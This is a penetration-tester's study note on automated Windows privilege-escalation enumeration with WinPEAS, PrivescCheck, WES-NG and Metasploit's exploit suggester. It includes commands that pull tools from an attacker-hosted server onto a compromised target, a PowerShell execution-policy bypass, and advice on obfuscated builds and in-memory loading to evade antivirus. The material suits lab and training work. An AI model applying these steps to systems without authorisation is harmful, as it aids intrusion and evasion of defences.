# Windows — Automated Enumeration

Scripts that run the manual checks from [[Windows-Privilege-Escalation]] for you and print the results. They shorten enumeration; they do **not** replace judgement — every one of them misses vectors, and their output is a candidate list, not a finding list.

The split that decides which tool to reach for:

| | Runs on | Sees | Costs |
|---|---|---|---|
| **On-target scanners** — WinPEAS, PrivescCheck | the target | live config: services, ACLs, registry, scheduled tasks, credential files | a file on disk / a process → AV may catch it |
| **Attacker-side suggesters** — WES-NG, MSF suggester | your box | *only* missing patches, from `systeminfo` text | quiet, but blind to every misconfiguration |

None of the four ships with Windows or with Kali. You fetch each once onto your **own** attack box, and the two on-target ones then have to be carried across to the target before they can run at all ([[File-Transfer]]). The download URLs, all pinned to `latest/download/` so they never point at a stale release:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
```

```bash
wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
```

```bash
pipx install wesng || pip install wesng
```

- WinPEAS also ships `winPEASx64_ofs.exe` at the same URL path — an obfuscated build that slips past some signature-based AV; reach for it the moment the plain `.exe` is eaten. `winPEASany.exe` is the .NET-any-CPU build for hosts where you are unsure of the architecture, and `winPEAS.bat` is the last-resort version for a box with no .NET at all.
- `pipx` keeps WES-NG in its own environment so it does not collide with Kali's system Python; plain `pip install wesng` works too. Both put a `wes.py` on your `PATH`.

**[[Security-Terms#^av|AV]]** below means antivirus, the on-target software that inspects files as they are written and processes as they start.

So they are not competitors — they answer different questions. A scanner finds the writable service; a suggester finds the unpatched kernel. Neither sees the other's category.

> [!important] Run `whoami /priv` before any of them
> The single most useful line comes free and instantly: `whoami /priv` prints the privileges in your **token** — the badge Windows stamps on every process you start, carrying your account, your groups and your special rights — and that decides which of the paths in [[Windows-Privilege-Escalation]] is even open. Scanner output is unreadable without that context — you will not know which red highlight matters. Manual first, script second.

## WinPEAS — on-target scanner

```bash
powershell wget http://<your-ip>/winPEASx64.exe -outfile winPEASx64.exe
```

```bash
.\winPEASx64.exe > out.txt
```

- WinPEAS → "Windows Privilege Escalation Awesome Script", one self-contained `.exe` from the [[Security-Terms#^peass|PEASS-ng]] project on GitHub. It runs **on the target** and sweeps misconfigurations, credentials, services and privesc vectors in a single pass.
- getting it there → you already fetched `winPEASx64.exe` onto Kali (the `wget` at the top of this note). Serve the directory it is in with `python3 -m http.server 80`, and `<your-ip>` is your own address on the network the target can reach — `ip a` on Linux, usually the `tun0` interface when you are on a [[Security-Terms#^vpn|VPN]]. Full transfer options: [[File-Transfer]].
- run it from the directory you dropped it in — `.\` means "in the current folder", and PowerShell requires it, because unlike `cmd.exe` it will not run a file from the working directory without being told to.
- `> out.txt` → **always redirect.** The output is long and colour-coded; scrolling it live loses the top of it, and a non-interactive shell strips the colour that marks the findings.

## PrivescCheck — on-target scanner, PowerShell-native

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

```powershell
. .\PrivescCheck.ps1
```

```powershell
Invoke-PrivescCheck
```

- PrivescCheck → one PowerShell script file, `PrivescCheck.ps1` (the `wget` at the top of this note fetched it from itm4n's releases onto Kali). It runs **on the target** and covers the same ground as WinPEAS with no `.exe` to plant; carry it across the same way ([[File-Transfer]]). Because it is a `.ps1`, you can also skip the file entirely and run it straight from memory — see the `DownloadString` load in [[File-Transfer]], which never writes it to disk for AV to find.
- `Set-ExecutionPolicy Bypass` → the **execution policy** is PowerShell's own setting for which script files it is willing to run, and by default it refuses unsigned `.ps1` files. It is a rail against accidents rather than a security boundary, and this line lowers it. `-Force` answers the yes/no confirmation prompt for you, which matters because a non-interactive shell cannot type an answer and would hang instead.
- `-Scope Process` → the bypass dies with this shell; it does not touch the machine-wide policy, so it is the quiet way to run an unsigned script. Omit it and you either fail to change the policy (as a non-admin) or leave a machine-wide change behind (as an admin) — both wrong.
- `. .\PrivescCheck.ps1` → the leading dot is **dot-sourcing**: it runs the file in the current session so its functions stick around to be called. Without the dot the script runs in a child scope and `Invoke-PrivescCheck` is gone the moment it returns — `The term ... is not recognized`.
- Add `-Extended` for more checks, or `-Report out -Format HTML,TXT` to write a report out.

## WES-NG — attacker-side patch suggester

```bash
wes.py --update          # refresh the CVE/patch database FIRST
```

```bash
wes.py systeminfo.txt
```

The input is the target's `systeminfo` output, saved to a file and carried back to your box:

```cmd
systeminfo > systeminfo.txt
```

- WES-NG → "Windows Exploit Suggester – Next Generation", a Python script that runs **on your attack box** (`pip install wesng`, or clone the `bitsadmin/wesng` repository). It never touches the target; it only reads a text file you carried back from it.
- `--update` is not optional — a stale database misses recent patches and reports fixed bugs as open, so you waste time on CVEs the host is immune to. Run it before every real use.
- It reads the **Hotfix(s)** list in `systeminfo`. If that section is empty or truncated (some hardened builds hide it), WES-NG assumes nothing is patched and floods you with false positives.

## Metasploit — local_exploit_suggester

```text
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

- `set SESSION <id>` → the numeric id from `sessions -l`, which lists every session you currently hold with its number — not the target IP. A wrong or dead session id is the usual reason it returns nothing.
